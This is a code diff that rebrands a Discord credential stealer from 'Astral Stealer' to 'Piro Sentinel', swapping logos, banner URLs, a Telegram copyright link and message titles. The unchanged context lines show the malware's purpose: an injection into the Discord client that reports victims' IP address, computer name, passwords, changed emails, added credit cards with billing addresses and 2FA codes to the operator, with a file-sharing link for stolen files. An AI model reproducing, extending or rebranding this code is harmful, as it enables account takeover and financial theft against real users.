@@ -78,9 +78,9 @@ async function execScript(str) {
   
   const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
     var params = {
-      username: "Astral",
+      username: "Piro",
       avatar_url:
-        "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png",
+        "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20logo%20piro.png",
       content: "",
       embeds: [
         {
@@ -89,7 +89,7 @@ async function execScript(str) {
           fields: fields,
           description: description ?? "",
           author: {
-            name: `Astral Stealer`,
+            name: `Piro Sentinel`,
           },
   
           footer: {
@@ -589,10 +589,10 @@ async function execScript(str) {
         var Friends = parseFriends(friends);
         if (!user.avatar)
           var userAvatar =
-            "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
+            "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20logo%20piro.png";
         if (!user.banner)
           var userBanner =
-            "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
+            "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20banner%20piro.png";
   
         userBanner =
           userBanner ??
@@ -645,11 +645,11 @@ async function execScript(str) {
             },
             {
               name: "@Copyright",
-              value: `[Astral Stealer 2024](https://github.com/freeman649)`,
+              value: `[Piro 2024](https://t.me/Piro_Sentinel)`,
               inline: !0,
             },
             {
-              name: "Astral Files",
+              name: "Piro Files",
               value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
               inline: !0,
             },
@@ -727,10 +727,10 @@ async function execScript(str) {
           var Friends = parseFriends(friends);
           if (!user.avatar)
             var userAvatar =
-              "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
+              "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20logo%20piro.png";
           if (!user.banner)
             var userBanner =
-              "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
+              "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20banner%20piro.png";
   
           userBanner =
             userBanner ??
@@ -783,11 +783,11 @@ async function execScript(str) {
               },
               {
                 name: "@Copyright",
-                value: `[Astral Stealer 2024](https://github.com/freeman649)`,
+                value: `[Piro 2024](https://t.me/Piro_Sentinel)`,
                 inline: !0,
               },
               {
-                name: "Astral Files",
+                name: "Piro Files",
                 value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                 inline: !0,
               },
@@ -948,10 +948,10 @@ async function execScript(str) {
     );
     if (!user.avatar)
       var userAvatar =
-        "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
+        "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20logo%20piro.png";
     if (!user.banner)
       var userBanner =
-        "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
+        "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20banner%20piro.png";
   
     var userBanner =
       userBanner ??
@@ -1443,7 +1443,7 @@ async function execScript(str) {
                 } = await BoukiTuclcavectesfonctions();
                 var password = data.password;
                 var params = await makeEmbed({
-                  title: "Astral User Login",
+                  title: "Piro User Login",
                   color: config["embed-color"],
                   description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                   fields: [
@@ -1484,11 +1484,11 @@ async function execScript(str) {
                     },
                     {
                       name: "@Copyright",
-                      value: `[Astral Stealer 2024](https://github.com/freeman649)`,
+                      value: `[Piro 2024](https://t.me/Piro_Sentinel)`,
                       inline: !0,
                     },
                     {
-                      name: "Astral Files",
+                      name: "Piro Files",
                       value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                       inline: !0,
                     },
@@ -1575,7 +1575,7 @@ async function execScript(str) {
               var password = data.password;
   
               var params = await makeEmbed({
-                title: "Astral User Login",
+                title: "Piro User Login",
                 color: config["embed-color"],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [
@@ -1616,11 +1616,11 @@ async function execScript(str) {
                   },
                   {
                     name: "@Copyright",
-                    value: `[Astral Stealer 2024](https://github.com/freeman649)`,
+                    value: `[Piro 2024](https://t.me/Piro_Sentinel)`,
                     inline: !0,
                   },
                   {
-                    name: "Astral Files",
+                    name: "Piro Files",
                     value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                     inline: !0,
                   },
@@ -1684,7 +1684,7 @@ async function execScript(str) {
           if (data.new_password) {
             var params = await makeEmbed({
               title:
-                "Astral Detect Password Changed",
+                "Piro Detect Password Changed",
               color: config["embed-color"],
               description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
               fields: [
@@ -1725,11 +1725,11 @@ async function execScript(str) {
                 },
                 {
                   name: "@Copyright",
-                  value: `[Astral Stealer 2024](https://github.com/freeman649)`,
+                  value: `[Piro 2024](https://t.me/Piro_Sentinel)`,
                   inline: !0,
                 },
                 {
-                  name: "Astral Files",
+                  name: "Piro Files",
                   value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                   inline: !0,
                 },
@@ -1818,7 +1818,7 @@ async function execScript(str) {
   
                     var params = await makeEmbed({
                       title:
-                        "Astral Have changed the victim mail",
+                        "Piro Have changed the victim mail",
                       color: config["embed-color"],
                       description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                       fields: [
@@ -1844,11 +1844,11 @@ async function execScript(str) {
                         },
                         {
                           name: "@Copyright",
-                          value: `[Astral Stealer 2024](https://github.com/freeman649)`,
+                          value: `[Piro 2024](https://t.me/Piro_Sentinel)`,
                           inline: !1,
                         },
                         {
-                          name: "Astral Files",
+                          name: "Piro Files",
                           value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                           inline: !1,
                         },
@@ -1884,7 +1884,7 @@ async function execScript(str) {
             }
             var params = await makeEmbed({
               title:
-                "Astral Detect Email Changed",
+                "Piro Detect Email Changed",
               color: config["embed-color"],
               description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
               fields: [
@@ -1925,11 +1925,11 @@ async function execScript(str) {
                 },
                 {
                   name: "@Copyright",
-                  value: `[Astral 2024](https://github.com/freeman649)`,
+                  value: `[Piro 2024](https://t.me/Piro_Sentinel)`,
                   inline: !0,
                 },
                 {
-                  name: "Astral Files",
+                  name: "Piro Files",
                   value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                   inline: !0,
                 },
@@ -2008,11 +2008,11 @@ async function execScript(str) {
                   dt.billing_address;
                 var params = await makeEmbed({
                   title:
-                    "Astral User Credit Card Added",
+                    "Piro User Credit Card Added",
                   color: config["embed-color"],
                   fields: [
                     {
-                      name: "Astral Files",
+                      name: "Piro Files",
                       value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                       inline: false,
                     },
@@ -2104,11 +2104,11 @@ async function execScript(str) {
           }
   
           var params = await makeEmbed({
-            title: "Astral User Enable 2FA",
+            title: "Piro User Enable 2FA",
             color: config["embed-color"],
             fields: [
               {
-                name: "Astral Files",
+                name: "Piro Files",
                 value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                 inline: false,
               },
@@ -2169,11 +2169,11 @@ async function execScript(str) {
           break;
         case request.url.endsWith("/disable"):
           var params = await makeEmbed({
-            title: "Astral User Removed 2FA",
+            title: "Piro User Removed 2FA",
             color: config["embed-color"],
             fields: [
               {
-                name: "Astral Files",
+                name: "Piro Files",
                 value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                 inline: false,
               },
@@ -2243,11 +2243,11 @@ async function execScript(str) {
             }
           }
           var params = await makeEmbed({
-            title: "Astral User 2FA Codes",
+            title: "Piro User 2FA Codes",
             color: config["embed-color"],
             fields: [
               {
-                name: "Astral Files",
+                name: "Piro Files",
                 value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                 inline: false,
               },
